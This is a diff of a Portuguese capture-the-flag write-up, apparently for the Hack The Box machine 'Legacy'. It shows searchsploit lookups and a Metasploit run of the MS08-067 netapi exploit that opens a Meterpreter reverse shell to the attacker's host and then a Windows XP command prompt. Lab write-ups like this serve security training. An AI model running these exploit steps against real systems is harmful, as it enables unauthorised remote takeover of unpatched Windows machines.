@@ -86,7 +86,7 @@ Host script results:                                                            
 |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
 |_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
 ```
-## Exploitation smb-vuln-ms08-067:
+## Find Exploits:
 
 De acordo com o resultado do nmap utilizando os scripts em busca de vulns, foi encontrada duas vulnerabilidades **smb-vuln-ms08-067** e **smb-vuln-ms17-010**, com o searchsploit podemos procurar por exploits disponiveis.
 
@@ -121,4 +121,126 @@ Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution 
 Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution (MS17-010)                                            | windows_x86-64/remote/41987.py
 ----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
+```
+
+## Exploitation smb-vuln-ms08-067:
+
+Tentei outras formas de explorar manualmente sem o uso do MSFCONSOLE, no entanto, tive dificuldades por conta que sempre a maquina dava pau. Depois de muitas tentativas sem sucesso resolvi usar o MSFCONSLE.
+
+Iniciamos nosso MSFCONSOLE.
+```
+root@kali:~/HTB-Windows# msfconsole                                                                                                                               [697/697]
+                                                                                                                                                                           
+                                   ___          ____                                                                                                                       
+                               ,-""   `.      < HONK >                                                                                                                     
+                             ,'  _   e )`-._ /  ----                                                                                                                       
+                            /  ,' `-._<.===-'                                                                                                                              
+                           /  /                                                                                                                                            
+                          /  ;                                                                                                                                             
+              _          /   ;                                                                                                                                             
+ (`._    _.-"" ""--..__,'    |                                                                                                                                             
+ <_  `-""                     \                                                                                                                                            
+  <`-                          :                                                                                                                                           
+   (__   <__.                  ;                                                                                                                                           
+     `-.   '-.__.      _.'    /                                                                                                                                            
+        \      `-.__,-'    _,'                                                                                                                                             
+         `._    ,    /__,-'                                                                                                                                                
+            ""._\__,'< <____                                                                                                                                               
+                 | |  `----.`.                                                                                                                                             
+                 | |        \ `.                                                                                                                                           
+                 ; |___      \-``                                                                                                                                          
+                 \   --<                                                                                                                                                   
+                  `.`.<                                                                                                                                                    
+                    `-'                                                                                                                                                    
+                                                                                                                                                                           
+                                                                                                                                                                           
+                                                                                                                                                                           
+       =[ metasploit v5.0.92-dev                          ]                                                                                                                
++ -- --=[ 2026 exploits - 1102 auxiliary - 343 post       ]                                                                                                                
++ -- --=[ 562 payloads - 45 encoders - 10 nops            ]                                                                                                                
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: Metasploit can be configured at startup, see msfconsole --help to learn more
+```
+
+Depois de iniciado, procuramos por netapi referente a noss vuln encontrada na etapa anteriot.
+```
+msf5 exploit(windows/smb/ms17_010_psexec) > search netapi
+
+Matching Modules
+================
+
+   #  Name                                 Disclosure Date  Rank    Check  Description
+   -  ----                                 ---------------  ----    -----  -----------
+   0  exploit/windows/smb/ms03_049_netapi  2003-11-11       good    No     MS03-049 Microsoft Workstation Service NetAddAlternateComputerName Overflow
+   1  exploit/windows/smb/ms06_040_netapi  2006-08-08       good    No     MS06-040 Microsoft Server Service NetpwPathCanonicalize Overflow
+   2  exploit/windows/smb/ms06_070_wkssvc  2006-11-14       manual  No     MS06-070 Microsoft Workstation Service NetpManageIPCConnect Overflow
+   3  exploit/windows/smb/ms08_067_netapi  2008-10-28       great   Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
+```
+
+Selecionamos então o **exploit/windows/smb/ms08_067_netapi** MS08-067 Microsoft Server Service Relative Path Stack Corruption
+Lembre-se que essa maquina pode crashar e será preciso reiniciar.
+```
+msf5 exploit(windows/smb/ms17_010_psexec) > use exploit/windows/smb/ms08_067_netapi
+msf5 exploit(windows/smb/ms08_067_netapi) > show options 
+
+Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT    445              yes       The SMB service port (TCP)
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+```
+
+Veja alguns erros que eu tive
+```
+msf5 exploit(windows/smb/ms08_067_netapi) > set rhosts 10.10.10.4
+rhosts => 10.10.10.4
+msf5 exploit(windows/smb/ms08_067_netapi) > run
+
+[*] Started reverse TCP handler on 10.10.14.36:4444 
+[-] 10.10.10.4:445 - Exploit failed [unreachable]: Rex::ConnectionTimeout The connection timed out (10.10.10.4:445).
+[*] Exploit completed, but no session was created.
+msf5 exploit(windows/smb/ms08_067_netapi) > set verbose true
+verbose => true
+msf5 exploit(windows/smb/ms08_067_netapi) > run
+
+[*] Started reverse TCP handler on 10.10.14.36:4444 
+[-] 10.10.10.4:445 - Exploit failed [unreachable]: Rex::ConnectionTimeout The connection timed out (10.10.10.4:445).
+[*] Exploit completed, but no session was created.
+msf5 exploit(windows/smb/ms08_067_netapi) > ping 10.10.10.4
+[*] exec: ping 10.10.10.4
+
+PING 10.10.10.4 (10.10.10.4) 56(84) bytes of data.
+64 bytes from 10.10.10.4: icmp_seq=1 ttl=127 time=203 ms
+64 bytes from 10.10.10.4: icmp_seq=2 ttl=127 time=211 ms
+64 bytes from 10.10.10.4: icmp_seq=3 ttl=127 time=244 ms
+```
+
+Depois de ter reiniciado a maquina executamos o exploit novamente.
+```
+msf5 exploit(windows/smb/ms08_067_netapi) > run
+
+[*] Started reverse TCP handler on 10.10.14.36:4444 
+[*] 10.10.10.4:445 - Automatically detecting the target...
+[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:Unknown
+[*] 10.10.10.4:445 - We could not detect the language pack, defaulting to English
+[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
+[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
+[*] Sending stage (176195 bytes) to 10.10.10.4
+[*] Meterpreter session 1 opened (10.10.14.36:4444 -> 10.10.10.4:1032) at 2020-06-20 13:50:34 -0400
+
+meterpreter > shell
+Process 1840 created.
+Channel 1 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
 ```
